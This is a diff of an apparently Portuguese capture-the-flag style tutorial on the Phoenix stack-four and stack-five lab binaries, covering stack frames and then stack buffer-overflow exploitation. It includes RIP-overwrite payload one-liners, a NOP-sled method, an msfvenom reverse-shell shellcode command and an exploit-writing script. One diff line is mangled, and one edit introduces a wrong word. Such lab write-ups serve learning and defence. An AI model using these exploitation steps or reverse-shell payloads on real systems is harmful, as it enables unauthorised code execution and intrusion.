-<h4><a class="header" href="#-revisão" id="-revisão">☕ Revisão</a></h4>
+<a class="header" href="print.html#-revisão" id="-revisão"><h4>☕ Revisão</h4></a>
 <pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
 - Ela cresce para valores menores: 
     - A memória é representada de cabeça pra baixo!
@@ -914,14 +826,14 @@ jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
     - Portanto, a stack cresce em direção à valores menores :D 
 
 </code></pre>
-<h4><a class="header" href="#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></h4>
+<a class="header" href="print.html#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-"><h4>🖼️ Stack Frame ( Moldura da Stack )</h4></a>
 <p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
 <p>O rbp indica a base da stack, e rsp o topo.</p>
 <p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
 <p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
 <p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
 <blockquote>
-<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
+<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente</p>
 </blockquote>
 <p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
 <p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
@@ -941,15 +853,15 @@ Fn main() {
 }
 </code></pre>
 <p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
-<h4><a class="header" href="#-prólogo" id="-prólogo">🔒 Prólogo</a></h4>
+<a class="header" href="print.html#-prólogo" id="-prólogo"><h4>🔒 Prólogo</h4></a>
 <ul>
-<li>Se a função recever argumentos, passar eles
-Chamar a função </li>
+<li>Se a função receber argumentos, passar eles
+Chamar a função</li>
 <li>Salvar o frame atual</li>
 <li>Criar novo frame
 Executar a função</li>
 </ul>
-<h5><a class="header" href="#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></h5>
+<a class="header" href="print.html#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles"><h5>Se a função receber argumentos, salvar eles</h5></a>
 <p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
 <pre><code class="language-x86asm">(x, y)
 push y
@@ -957,17 +869,17 @@ push x
 </code></pre>
 <p>Mas comumente, os argumentos são passados pelos registers:</p>
 <pre><code class="language-x86asm">RAX (Valor retornado)
-RDI (1º parametro)
-RSI (2º parametro)
-RDX (3º parametro)
+RDI (1º parâmetro)
+RSI (2º parâmetro)
+RDX (3º parâmetro)
 ...
 </code></pre>
 <blockquote>
-<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser nescessário dar um push neles, e restaura-los no epilogo </p>
+<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necessário dar um push neles, e restaura-los no epilogo</p>
 </blockquote>
-<h4><a class="header" href="#salvar-o-frame-atual" id="salvar-o-frame-atual">Salvar o frame atual</a></h4>
+<a class="header" href="print.html#salvar-o-frame-atual" id="salvar-o-frame-atual"><h4>Salvar o frame atual</h4></a>
 <pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
-	       ; e sim o endereço da próxima instrução 
+           ; e sim o endereço da próxima instrução 
 push RBP       ; salva o RBP
 </code></pre>
 <p>Atualmente, a stack está assim</p>
@@ -976,17 +888,17 @@ rip main                     | Frame de
 ....                         | main()
 ret de main         &lt;- RBP   -
 </code></pre>
-<h4><a class="header" href="#criar-novo-frame" id="criar-novo-frame">Criar novo frame</a></h4>
+<a class="header" href="print.html#criar-novo-frame" id="criar-novo-frame"><h4>Criar novo frame</h4></a>
 <p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
 <pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
             ; Ou melhor : rbp &quot;anda&quot; até o rsp
 </code></pre>
 <p>Atualmente, a stack está assim</p>
-<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localizção
+<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localização
 rip main                   
 ... stack frame de main omitido           
 </code></pre>
-<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função </p>
+<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função</p>
 <blockquote>
 <p>A stack cresce para valores menores :)</p>
 </blockquote>
@@ -995,7 +907,7 @@ rip main
 </code></pre>
 <p>Atualmente, a stack está assim</p>
 <pre><code class="language-x86asm">...          &lt;- RSP      -
-Variaveis de print_dois  |
+Variáveis de print_dois  |
 ...                      | Frame de
 ...                      | print_dois()
 rbp main     &lt;- RBP      -
@@ -1017,7 +929,7 @@ call
   sub rsp 0x1234
   executar a função
 </code></pre>
-<h4><a class="header" href="#-epílogo" id="-epílogo">🔑 Epílogo</a></h4>
+<a class="header" href="print.html#-epílogo" id="-epílogo"><h4>🔑 Epílogo</h4></a>
 <p>O epilogo é bem mais simples que o prologo:</p>
 <pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
 - Restaurar RIP  e retornar           -&gt; ret
@@ -1035,15 +947,16 @@ rip main
 <p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
 <p>Atualmente, a stack está assim</p>
 <pre><code class="language-x86asm">...                    
-Variaveis print dois   A região não é apagada, pois consumiria processamento a toa!
+Variáveis print dois   A região não é apagada, pois consumiria processamento a toa!
 ...         O valores ficam largados lá até uma nova função escrever por cima deles..
-...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatorio
+...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatório
 ...         Eles pode ser ignorado pois nem está mais na stack
                           
 rbp main  &lt;- RBP e RSP - O topo da stack
 rip main                                
 </code></pre>
-<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> (remover o valor no topo da stack (ver acima por referencia), e colocalo no alvo: <strong>rbp</strong>)</p>
+<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code>
+(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
 <pre><code class="language-x86asm">--- omitido ---
 rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
 ...
@@ -1063,28 +976,28 @@ proxima instrução &lt;- RIP
 ret da main       &lt;- RBP
 </code></pre>
 <p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
-<h1><a class="header" href="#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></h1>
-<p>Existem algumas variaveis especiais dentro do processador:</p>
+<a class="header" href="print.html#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber"><h1>🌍 Caso você tenha viajado, o que você precisa saber</h1></a>
+<p>Existem algumas variáveis especiais dentro do processador:</p>
 <pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
 RBP Base Pointer        -&gt; Aponta para a base da stack
 RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
 </code></pre>
-<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variaveis:</p>
+<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variáveis:</p>
 <pre><code class="language-x86asm">buffer[64]
 uns int qualquer usado na função
 ....
 rbp
 rip
 </code></pre>
-<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos execicios anteriores, tambem conseguimos 
+<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exercícios anteriores, também conseguimos
 alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
-<h1><a class="header" href="#-exploit-1" id="-exploit-1">🔥 Exploit</a></h1>
-<h2><a class="header" href="#-analisar-o-programa" id="-analisar-o-programa">🔬 Analisar o programa</a></h2>
+<a class="header" href="print.html#-exploit-1" id="-exploit-1"><h1>🔥 Exploit</h1></a>
+<a class="header" href="print.html#-analisar-o-programa" id="-analisar-o-programa"><h2>🔬 Analisar o programa</h2></a>
 <p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
-<p><code>main</code> printa a mensagem do começo do nivel e chama start_level</p>
+<p><code>main</code> printa a mensagem do começo do nível e chama start_level</p>
 <p><code>complete_level</code> é a função que precisamos chamar</p>
-<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulneravel) é chamada num <code>buffer[64]</code></p>
-<h2><a class="header" href="#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></h2>
+<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulnerável) é chamada num <code>buffer[64]</code></p>
+<a class="header" href="print.html#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa"><h2>⁉️ O compilador adicionou coisa???</h2></a>
 <p>Se colocarmos somente um byte:</p>
 <pre><code class="language-bash">$ ./stack-four 
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
@@ -1100,7 +1013,7 @@ Segmentation fault
 <p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
 <p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
 <p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
-Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colcoar 64 bytes de <code>padding</code>!</p>
+Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colocar 64 bytes de <code>padding</code>!</p>
 <p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
 <p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
 <p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
@@ -1115,8 +1028,8 @@ and will be returning to 0x400000
 Segmentation fault
 </code></pre>
 <p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
-<h2><a class="header" href="#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level">🏠 Encontrar endereço de complete_level</a></h2>
-<p>Você se lembra como faz? Nos usamos no execicio passado....</p>
+<a class="header" href="print.html#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level"><h2>🏠 Encontrar endereço de complete_level</h2></a>
+<p>Você se lembra como faz? Nos usamos no exercício passado....</p>
 <blockquote>
 <p>cof cof objdump -d cof cof</p>
 </blockquote>
@@ -1146,27 +1059,27 @@ Welcome to phoenix/stack-four, brought to you by https://exploit.education
 and will be returning to 0x40061d
 Congratulations, you've finished phoenix/stack-four :-) Well done!
 </code></pre>
-<p>Esse foi um tutorial beeem longo, e com certeza o mais dificil! Se você chegou até aqui, parabens! :D</p>
-<h1><a class="header" href="#-solução-4" id="-solução-4">💫 Solução</a></h1>
+<p>Esse foi um tutorial beeem longo, e com certeza o mais difícil! Se você chegou até aqui, parabéns! :D</p>
+<a class="header" href="print.html#-solução-4" id="-solução-4"><h1>💫 Solução</h1></a>
 <pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
 Welcome to phoenix/stack-four, brought to you by https://exploit.education
 and will be returning to 0x40061d
 Congratulations, you've finished phoenix/stack-four :-) Well done!
 </code></pre>
-<h1><a class="header" href="#-objetivo-4" id="-objetivo-4">🎯 Objetivo</a></h1>
-<p>Finalmente! Tudo isso para chegar no BOF SRP (classico) :D</p>
-<p>Agora ta na hora de redirecionar o pointer para o nosso codigo malicioso (shellcode) para ganhar uma shell </p>
-<h1><a class="header" href="#-dicas-1" id="-dicas-1">💡 Dicas</a></h1>
+<a class="header" href="print.html#-objetivo-4" id="-objetivo-4"><h1>🎯 Objetivo</h1></a>
+<p>Finalmente! Tudo isso para chegar no BOF SRP (clássico) :D</p>
+<p>Agora ta na hora de redirecionar o pointer para o nosso código malicioso (shellcode) para ganhar uma shell</p>
+<a class="header" href="print.html#-dicas-1" id="-dicas-1"><h1>💡 Dicas</h1></a>
 <p>A instrução <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execução pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
-sequer conseguimos executar codigo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execução de código :D</p>
+sequer conseguimos executar código, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execução de código :D</p>
 <p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
-<h1><a class="header" href="#-exploit-2" id="-exploit-2">🔥 Exploit</a></h1>
-<h2><a class="header" href="#analisando-o-programa" id="analisando-o-programa">Analisando o programa</a></h2>
+<a class="header" href="print.html#-exploit-2" id="-exploit-2"><h1>🔥 Exploit</h1></a>
+<a class="header" href="print.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
 <p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
 <p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
-<p>Como você pode ver, não exite <code>complete_level()</code></p>
-<p>Para completar, precisamos executar nosso próprio codigo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
-<h2><a class="header" href="#agora-em-asm-d-analise-estatica" id="agora-em-asm-d-analise-estatica">Agora em ASM :D (analise estatica)</a></h2>
+<p>Como você pode ver, não existe <code>complete_level()</code></p>
+<p>Para completar, precisamos executar nosso próprio código (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
+<a class="header" href="print.html#agora-em-asm-d-analise-estática" id="agora-em-asm-d-analise-estática"><h2>Agora em ASM :D (analise estática)</h2></a>
 <p>Normalmente, o gdb printa assim:</p>
 <pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
    0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
@@ -1190,7 +1103,7 @@ mov    eax,0x0                    &lt;- args de start_level (nenhum)
 call   0x40058d &lt;start_level&gt;     &lt;- call start_level
    
    
-mov    eax,0x0                    &lt;- exit code (codigo de saida, 0=sem erro)
+mov    eax,0x0                    &lt;- exit code (código de saida, 0=sem erro)
 leave                             &lt;- Epilogo  
 </code></pre>
 <p>Agora vamos ver start_level</p>
@@ -1212,24 +1125,24 @@ leave                         &lt;- Epilogo
 ret
 </code></pre>
 <p>Agora vamos adicionar um breakpoint!</p>
-<h3><a class="header" href="#breakpoint" id="breakpoint">Breakpoint</a></h3>
+<a class="header" href="print.html#breakpoint" id="breakpoint"><h3>Breakpoint</h3></a>
 <blockquote>
 <p>Breakpoint = ponto de pausa</p>
 </blockquote>
-<p>Antes daquela intrução ser executada, sera substituida por <code>0xCC</code>. Isso faz o  debugger pausar a execução do programa naquela instrução!</p>
-<p>Quando continuamos executando (normalmente o comando é <strong>continue</strong>), o <code>0xCC</code> é substituido pela instrução certa :D</p>
+<p>Antes daquela intrusão ser executada, sera substituída por <code>0xCC</code>. Isso faz o  debugger pausar a execução do programa naquela instrução!</p>
+<p>Quando continuamos executando (normalmente o comando é <strong>continue</strong>), o <code>0xCC</code> é substituído pela instrução certa :D</p>
 <p>Se você esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
 <pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
 Breakpoint 1 at 0x40059c
 </code></pre>
-<p>&quot;b&quot; é o comando do gdb para adionar um breakpoint \ 
-A &quot;*&quot; tem haver com aquele dos pointers \ 
+<p>&quot;b&quot; é o comando do gdb para adicionar um breakpoint \
+A &quot;*&quot; tem haver com aquele dos pointers \
 O endereço é para &quot;<code>call gets</code>&quot;</p>
 <blockquote>
-<p>Dica: se você selecionar/sublinhar (clique esquerdo e passa o mouse em cima, você sabe do que eu to falando), e clicar o botão do meio no mouse (a rodinha) 
+<p>Dica: se você selecionar/sublinhar (clique esquerdo e passa o mouse em cima, você sabe do que eu to falando), e clicar o botão do meio no mouse (a rodinha)
 o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para você! Então não precisa copiar o endereço manualmente :D</p>
 </blockquote>
-<h2><a class="header" href="#agora-vamos-executar-o-programa-analise-dinamica" id="agora-vamos-executar-o-programa-analise-dinamica">Agora vamos executar o programa (analise dinamica)</a></h2>
+<a class="header" href="print.html#agora-vamos-executar-o-programa-analise-dinâmica" id="agora-vamos-executar-o-programa-analise-dinâmica"><h2>Agora vamos executar o programa (analise dinâmica)</h2></a>
 <p>126 As não causam erro, e 127 As causam... ue, mas pq? não era pra dar erro só em 128?</p>
 <pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
 Welcome to phoenix/stack-five, brought to you by https://exploit.education
@@ -1241,52 +1154,23 @@ Segmentation fault
 <p>Isso vai ser muito importante no próximo desafio: buffers são terminados com um null byte!</p>
 <p>Por enquanto, isso só nos mostra que o compilador não adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
 <p>E nós ja sabemos como controlar o EIP, então agora só precisamos saber para onde redirecionar a execução :)</p>
-<h2><a class="header" href="#encontrar-endereço-do-buffer" id="encontrar-endereço-do-buffer">Encontrar endereço do buffer</a></h2>
+<a class="header" href="print.html#encontrar-endereço-do-buffer" id="encontrar-endereço-do-buffer"><h2>Encontrar endereço do buffer</h2></a>
 <p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
 <blockquote>
-<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
-<p>r é o comand do gdb para rodar o programa!
-Adicionando &quot;&lt;&lt;&lt;&quot; nós podemos mandar uma string pro input! Tambem funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
-</blockquote>
-<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
-Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
-Welcome to phoenix/stack-five, brought to you by https://exploit.education
-
-Breakpoint 1, 0x000000000040059c in start_level ()
-
---- Output do gef ---
-</code></pre>
-<blockquote>
-<p>gef é uma extensão do gdb que vai te dar um monte de informação util quando você chegar num breakpoint</p>
-</blockquote>
-<p>O output do gef contem:
-<img src="stack/phoenix/./img/gef_example.png" alt="" />
-Porem, mais informações podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
-<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) não pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow é possivel (olha as linhas no final da segunda imagem)
-<img src="stack/phoenix/./img/stack_five/gef_A_overflow_0.png" alt="" />
-<img src="stack/phoenix/./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
-<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
-<img src="stack/phoenix/./img/stack_five/before_gets_0.png" alt="" /></p>
-<p>As partes importante no output do gef são:</p>
-<p>registers
-<img src="stack/phoenix/./img/stack_five/before_gets_3.png" alt="" /></p>
-<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
-<img src="stack/phoenix/./img/stack_five/before_gets_1.png" alt="" /></p>
-<blockquote>
-<p>Lembrete de que pointer começa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
+<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'<em>100)&quot;)</em>*7fff....</p>
 </blockquote>
 <p>stack
-<img src="stack/phoenix/./img/stack_five/before_gets_2.png" alt="" /></p>
-<p>Você tambem acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
+<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
+<p>Você também acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
 <p>(((Insira aquele meme muito velho da cabra gritando)))</p>
 <p>Então vamos avançar para próxima instrução (step: <code>s</code>) :D
-<img src="stack/phoenix/./img/stack_five/gef_after_gets_0.png" alt="" /></p>
+<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
 <p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
 <pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s é o comando para printar strings
 0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
 </code></pre>
 <p>Então nos ja temos o endereço dos nossos As :D ... que em breve serão shellcode :D</p>
-<p>Mas agora precisamos saber com presição quantos As até o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
+<p>Mas agora precisamos saber com precisão quantos As até o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
 <pre><code class="language-x86asm">gef&gt; info frame
 Stack level 0, frame at 0x7fffffffe640:
  rip = 0x4005a1 in start_level  saved rip = 0x4005c7
@@ -1305,31 +1189,31 @@ basta subtrair <code>endereço do rip salvo - endereço dos As</code></p>
 136
 </code></pre>
 <p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
-<p><img src="stack/phoenix/./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
+<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
 <p>RIP = BBBB (42424242) :D</p>
-<h2><a class="header" href="#nop-sled" id="nop-sled">NOP sled</a></h2>
-<p>Entretando, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nós não conseguimos saber com precisão que o buffer vai estar naquela localização :(</p>
+<a class="header" href="print.html#nop-sled" id="nop-sled"><h2>NOP sled</h2></a>
+<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nós não conseguimos saber com precisão que o buffer vai estar naquela localização :(</p>
 <p>Isso ocorre pois as envs são alocadas na stack. E elas variam muito, por exemplo, só de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
 <blockquote>
 <p>Dica: O gef pode nos ajudar a encontra-las
-<img src="stack/phoenix/./img/stack_five/gef_envs_1.png" alt="" /></p>
+<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
 </blockquote>
 <p>Por exemplo:</p>
-<p><img src="stack/phoenix/./img/stack_five/gef_envs_0.png" alt="" /></p>
+<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
 <p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
-<p>(Outro metodo de remediação é mencionado em <code>stack-six</code>)</p>
+<p>(Outro método de remediação é mencionado em <code>stack-six</code>)</p>
 <p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>eração) ! é uma instrução que não faz nada :D</p>
 <p>A representação em machine code do NOP é <code>0x90</code> :D Bem fácil de decorar, quem me dera escola fosse fácil assim hehehe :)</p>
-<p>O processador vai fazer nada e passar para a próxima, e se nós colocarmos varios desses em sequencia, o RIP vai &quot;deslizando&quot; através até chegar no nosso código!</p>
+<p>O processador vai fazer nada e passar para a próxima, e se nós colocarmos vários desses em sequencia, o RIP vai &quot;deslizando&quot; através até chegar no nosso código!</p>
 <p>Você pode imaginar um escorregador :D yuuuuupiii</p>
-<p><img src="stack/phoenix/./img/panda_slide_1.gif" alt="" /></p>
-<p>Então a gente redireciona o RIP para o meio do escorregador de NOPs, para ele delizar até o nosso código :D</p>
+<p><img src="./img/panda_slide_1.gif" alt="" /></p>
+<p>Então a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar até o nosso código :D</p>
 <p>Assim, mesmo se o buffer estiverem em um endereço diferente, o RIP vai chegar no nosso shellcode</p>
 <p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
 <p>O input que vai passar vai conter:</p>
 <pre><code class="language-x86asm">NOP * 135
 0xCC
-Enderço para ser colocado no RIP: 0x00007fffffffe5b0 + 70
+Endereço para ser colocado no RIP: 0x00007fffffffe5b0 + 70
 
 70 = metade do escorregador (135)
 </code></pre>
@@ -1345,8 +1229,8 @@ Enderço para ser colocado no RIP: 0x00007fffffffe5b0 + 70
 <pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
 </code></pre>
 <p>E na seção <code>code</code> do gef
-<img src="stack/phoenix/./img/stack_five/gef_run_xCC.png" alt="" />
-Meio dificil de ver, mas tem:</p>
+<img src="./img/stack_five/gef_run_xCC.png" alt="" />
+Meio difícil de ver, mas tem:</p>
 <pre><code class="language-x86asm">NOP
 NOP
 INT3
@@ -1354,11 +1238,11 @@ INT3
 (bad)
 </code></pre>
 <blockquote>
-<p>int3 é o nome de 0xCC, da mesma maneira que NOP é o nome de 0x90 </p>
+<p>int3 é o nome de 0xCC, da mesma maneira que NOP é o nome de 0x90</p>
 </blockquote>
-<p>Apos a nossa ultima intrução ha intruções invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
-<h2><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h2>
-<p>Shellcode é o codigo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) não autorizada )</p>
+<p>Apos a nossa ultima instrução ha instruções invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
+<a class="header" href="print.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
+<p>Shellcode é o código malicioso que vai ser executado ( normalmente te dando uma shell (terminal) não autorizada )</p>
 <p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
 <blockquote>
 <p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
@@ -1396,20 +1280,20 @@ buf += b'\xb6\xe5\xff\xff\xff\x7f'
 open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
 </code></pre>
 <blockquote>
-<p>O script /tmp/gerar_exploit.py vai gerar o que colocariamos no input, mas ao enves de printarmos para o terminal, vamos salvar em um arquivo binario (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
-<p>Depois é só ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
+<p>O script /tmp/gerar_exploit.py vai gerar o que colocaríamos no input, mas ao invés de printarmos para o terminal, vamos salvar em um arquivo binário (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)!</p>
+<p>Depois é só ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code></p>
 </blockquote>
 <p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: violação de segmento</code></p>
-<h2><a class="header" href="#corrigindo-o-problema" id="corrigindo-o-problema">Corrigindo o problema</a></h2>
+<a class="header" href="print.html#corrigindo-o-problema" id="corrigindo-o-problema"><h2>Corrigindo o problema</h2></a>
 <p>Nessa eu empaquei, e a solução veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
 <p>Então valeu pela ajuda :D</p>
-<p>Ao enves de colocar o endereço do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
-<p>E o beneficio é que, por estarmos pulando para uma parte estatica, e usando-a para redirecionar para o buffer, não corremos o risco do buffer mudar de endereço!</p>
-<p>Isso quer dizer que não precisamos mais do NOP slide :D </p>
-<h3><a class="header" href="#rop-gadgets" id="rop-gadgets">ROP Gadgets</a></h3>
-<p>Essa é uma tecnica chamada programação <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que você precisa saber por enquanto é que cada um desses <code>jmps</code> é chamado de <strong>gadget</strong></p>
+<p>Ao invés de colocar o endereço do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
+<p>E o beneficio é que, por estarmos pulando para uma parte estática, e usando-a para redirecionar para o buffer, não corremos o risco do buffer mudar de endereço!</p>
+<p>Isso quer dizer que não precisamos mais do NOP slide :D</p>
+<a class="header" href="print.html#rop-gadgets" id="rop-gadgets"><h3>ROP Gadgets</h3></a>
+<p>Essa é uma técnica chamada programação <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que você precisa saber por enquanto é que cada um desses <code>jmps</code> é chamado de <strong>gadget</strong></p>
 <p>Gadgets são instruções em outras partes do programa, que são reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
-<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamda <code>ROPgadget</code></p>
